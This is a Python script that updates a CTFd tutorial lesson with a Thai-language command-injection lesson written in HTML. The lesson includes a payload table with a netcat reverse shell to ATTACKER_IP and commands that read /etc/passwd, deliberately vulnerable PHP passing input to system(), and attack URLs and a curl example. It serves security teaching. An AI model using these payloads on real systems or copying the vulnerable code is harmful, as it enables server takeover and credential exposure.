import json
from CTFd import create_app

app = create_app()
with app.app_context():
    from CTFd.plugins.tutorials import TutorialLesson
    from CTFd.models import db, Challenges
    from CTFd.utils import markdown

    lesson = TutorialLesson.query.get(178)
    blocks = json.loads(lesson.content)

    # 1. READ SVGs FROM test_chapter5_svgs and test_all_four_svgs
    import test_chapter5_svgs
    import test_all_four_svgs

    cmdi_svg = test_chapter5_svgs.cmdi_svg.strip()
    xss_svg = test_all_four_svgs.xss_svg.strip()
    lfi_svg = test_all_four_svgs.lfi_svg.strip()
    brute_svg = test_all_four_svgs.brute_svg.strip()

    # =========================================================================
    # SECTION 1: COMMAND INJECTIONS MASTERCLASS (REPLACES BLOCK 28)
    # =========================================================================
    cmdi_html = f"""<!-- ========================================== -->
<!-- COMMAND INJECTION MASTERCLASS -->
<!-- ========================================== -->
<div style="margin: 3rem auto 2rem; max-width: 1050px; background: linear-gradient(135deg, rgba(8, 14, 30, 0.98) 0%, rgba(20, 10, 25, 0.98) 100%); border: 1px solid rgba(239, 68, 68, 0.35); border-radius: 18px; box-shadow: 0 16px 45px rgba(0, 0, 0, 0.7), 0 0 35px rgba(239, 68, 68, 0.15); overflow: hidden;">
<div style="height: 4px; background: linear-gradient(90deg, #ef4444, #f59e0b, #ec4899, #00f0ff);"></div>

<div style="padding: 24px 28px 20px; border-bottom: 1px solid rgba(255, 255, 255, 0.08);">
<div style="display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 14px; margin-bottom: 16px;">
<div style="display: flex; align-items: center; gap: 14px;">
<div style="width: 56px; height: 56px; border-radius: 14px; background: radial-gradient(circle, rgba(239, 68, 68, 0.25) 0%, rgba(15, 23, 42, 0.9) 100%); border: 1.5px solid rgba(239, 68, 68, 0.55); display: flex; align-items: center; justify-content: center; font-size: 1.6rem; color: #ef4444; box-shadow: 0 0 25px rgba(239, 68, 68, 0.35); flex-shrink: 0;">
<i class="fas fa-terminal"></i>
</div>
<div>
<h3 style="margin: 0; color: #ffffff; font-size: 1.35rem; font-weight: 800; letter-spacing: -0.02em;">
💻 Command Injections — การแทรกคำสั่งควบคุมระบบปฏิบัติการหลังบ้าน
</h3>
<span style="color: #94a3b8; font-size: 0.82rem;">Chapter 5: Web Exploitations &bull; Copyright &copy; 2026 By Wongyos Keardsri (<a href="https://www.indusface.com/learning/what-is-command-injection/" target="_blank" style="color: #38bdf8; text-decoration: none;">Indusface Guide: What is Command Injection</a>)</span>
</div>
</div>
<div style="display: flex; gap: 8px; flex-wrap: wrap;">
<span style="background: rgba(239, 68, 68, 0.15); color: #fca5a5; font-family: monospace; font-size: 0.72rem; font-weight: 800; padding: 4px 14px; border-radius: 20px; border: 1px solid rgba(239, 68, 68, 0.35);">
OWASP A03: INJECTION
</span>
<span style="background: rgba(245, 158, 11, 0.15); color: #fde047; font-family: monospace; font-size: 0.72rem; font-weight: 800; padding: 4px 14px; border-radius: 20px; border: 1px solid rgba(245, 158, 11, 0.35);">
CWE-78: OS COMMAND
</span>
</div>
</div>

<p style="color: #cbd5e1; font-size: 0.9rem; line-height: 1.75; margin: 0 0 14px;">
<strong>Command Injection</strong> คือช่องโหว่ความปลอดภัยระดับวิกฤตที่เปิดโอกาสให้ผู้โจมตีสามารถ <strong>สั่งประมวลผลคำสั่งระบบปฏิบัติการ (Arbitrary System Commands)</strong> บนเครื่องเซิร์ฟเวอร์ได้โดยตรง ผ่านอินพุตที่ไม่ได้ผ่านการตรวจสอบหรือตัดอักขระพิเศษ (Improperly Sanitized User Inputs) หากเว็บแอปพลิเคชันนำอินพุตของผู้ใช้ไปต่อสตริงเข้ากับคำสั่งระบบ เช่น <code>system()</code>, <code>exec()</code>, หรือ <code>passthru()</code> ผู้โจมตีจะสามารถใช้ตัวคั่นคำสั่ง (Command Separators) เพื่อยึดอำนาจควบคุมเครื่องเซิร์ฟเวอร์ได้อย่างสมบูรณ์
</p>
</div>

<!-- Animated SVG -->
<div style="padding: 22px 28px 16px;">
<div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px; flex-wrap: wrap; gap: 8px;">
<span style="color: #ef4444; font-family: monospace; font-size: 0.84rem; font-weight: 800; text-transform: uppercase; letter-spacing: 0.08em; display: flex; align-items: center; gap: 8px;">
<i class="fas fa-project-diagram"></i> แผนภาพจำลองการเจาะระบบแบบ Command Injection (OS EXECUTION PIPELINE)
</span>
<span style="background: rgba(239, 68, 68, 0.15); color: #f87171; font-family: monospace; font-size: 0.7rem; font-weight: 800; padding: 2px 8px; border-radius: 4px;">
ANIMATED PIPELINE
</span>
</div>
{cmdi_svg}
</div>

<!-- Command Injection Payloads Table -->
<div style="padding: 0 28px 24px; background: rgba(5, 8, 18, 0.85);">
<h4 style="margin: 16px 0 14px; color: #fbbf24; font-size: 0.95rem; font-weight: 800; text-transform: uppercase; letter-spacing: 0.06em; display: flex; align-items: center; gap: 8px;">
<i class="fas fa-list-check"></i> คลังเพย์โหลดคำสั่ง Command Injections (Linux &amp; Windows Payloads)
</h4>

<div style="background: rgba(15, 23, 42, 0.9); border: 1px solid rgba(239, 68, 68, 0.35); border-radius: 12px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.5); margin-bottom: 20px;">
<div style="overflow-x: auto;">
<table style="width: 100%; border-collapse: collapse; font-size: 0.84rem; text-align: left;">
<thead>
<tr style="background: rgba(255,255,255,0.02); border-bottom: 1px solid rgba(255,255,255,0.06); font-size: 0.72rem; text-transform: uppercase; letter-spacing: 0.05em;">
<th style="padding: 12px 20px; color: #ef4444; width: 34%;">คำสั่งเพย์โหลด (Payload)</th>
<th style="padding: 12px 20px; color: #94a3b8; width: 66%;">คำอธิบายการทำงาน (Description)</th>
</tr>
</thead>
<tbody>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #ef4444;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #ef4444;">; ls -l</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">รันคำสั่ง <code>ls -l</code> แสดงรายการไฟล์ในไดเรกทอรีปัจจุบัน (Linux)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #ef4444;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #ef4444;">; id</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">แสดงรหัสประจำตัวผู้ใช้และกลุ่ม (UID &bull; GID) ที่เว็บเซิร์ฟเวอร์กำลังรันอยู่ (Linux)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #ef4444;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #ef4444;">&amp; whoami</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">แสดงชื่อผู้ใช้ปัจจุบัน (ใช้ <code>&amp;</code> เพื่อเลี่ยงตัวกรองที่บล็อกเครื่องหมายเซมิโคลอน <code>;</code> ใช้งานได้ทั้ง Linux และ Windows)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #ef4444;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #ef4444;">&amp; echo vulnerable</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">ทดสอบว่าคำสั่งถูกส่งไปรันบนระบบปฏิบัติการจริงหรือไม่ โดยการสั่งพิมพ์ข้อความทดสอบ</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #ef4444;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #ef4444;">`cat /etc/passwd`</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">ใช้สัญลักษณ์ Backtick (<code>`...`</code>) รันคำสั่งย่อยเพื่ออ่านไฟล์บัญชีระบบ (Linux only)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #ef4444;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #ef4444;">$(whoami)</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">ใช้ไวยากรณ์ Command Substitution <code>$(...)</code> หลบเลี่ยงตัวกรองเพื่อรันคำสั่ง <code>whoami</code></td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #ef4444;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #ef4444;">$(cat /etc/passwd)</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">อ่านข้อมูลลับในไฟล์ <code>/etc/passwd</code> โดยอาศัย Command Substitution</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #ef4444;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #ef4444;">; nc -e /bin/sh &lt;ATTACKER_IP&gt; 4444</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">ยิง Reverse Shell ด้วย Netcat กลับไปยังเครื่องของผู้โจมตีเพื่อเข้ายึดเชลล์เต็มรูปแบบ (Linux)</td>
</tr>
<tr>
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #ef4444;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #ef4444;">; net user Administrator /domain</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">สืบค้นข้อมูลผู้ดูแลระบบโดเมนของ Windows Server</td>
</tr>
</tbody>
</table>
</div>
</div>

<!-- Real Code Examples -->
<h4 style="margin: 0 0 14px; color: #38bdf8; font-size: 0.95rem; font-weight: 800; text-transform: uppercase; letter-spacing: 0.06em; display: flex; align-items: center; gap: 8px;">
<i class="fas fa-code"></i> ตัวอย่างโค้ดช่องโหว่และการทดสอบเจาะจริง (Vulnerability in Action)
</h4>

<div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(310px, 1fr)); gap: 14px;">
<div style="background: #040711; border: 1px solid rgba(56, 189, 248, 0.25); border-radius: 10px; padding: 14px;">
<div style="color: #38bdf8; font-weight: bold; font-size: 0.8rem; margin-bottom: 6px;"># 1. โค้ด PHP ที่มีช่องโหว่ (Vulnerable PHP Code)</div>
<pre style="background: #02040a; padding: 8px 12px; border-radius: 6px; margin: 0; font-size: 0.74rem; color: #e2e8f0; overflow-x: auto;"><code>&lt;?php
    $cmd = $_GET['cmd'];
    system("ping -c 1 " . $cmd);
?&gt;</code></pre>
</div>
<div style="background: #040711; border: 1px solid rgba(245, 158, 11, 0.25); border-radius: 10px; padding: 14px;">
<div style="color: #fde047; font-weight: bold; font-size: 0.8rem; margin-bottom: 6px;"># 2. การโจมตีผ่าน Web Browser URL</div>
<pre style="background: #02040a; padding: 8px 12px; border-radius: 6px; margin: 0; font-size: 0.74rem; color: #e2e8f0; overflow-x: auto;"><code>http://target.com/vuln.php?cmd=;whoami
http://target.com/vuln.php?cmd=$(id)
http://target.com/vuln.php?cmd=;%20ls%20-l</code></pre>
</div>
<div style="background: #040711; border: 1px solid rgba(239, 68, 68, 0.25); border-radius: 10px; padding: 14px;">
<div style="color: #fca5a5; font-weight: bold; font-size: 0.8rem; margin-bottom: 6px;"># 3. การโจมตีผ่าน cURL (Bash Shell)</div>
<pre style="background: #02040a; padding: 8px 12px; border-radius: 6px; margin: 0; font-size: 0.74rem; color: #e2e8f0; overflow-x: auto;"><code>curl -X POST -d "cmd=$(cat /etc/passwd)" http://target.com/vuln.php</code></pre>
</div>
</div>

</div>
</div>"""

    clean_cmdi = '\n'.join([l.lstrip() for l in cmdi_html.split('\n')])
    blocks[28]['value'] = clean_cmdi
    print("Block 28 updated with Command Injections Masterclass!")

    lesson.content = json.dumps(blocks, ensure_ascii=False)
    db.session.commit()

    rendered = markdown(clean_cmdi)
    print("CmdI rendered length:", len(rendered), "any <p>:", "<p>" in rendered, "any &lt;div:", "&lt;div" in rendered)
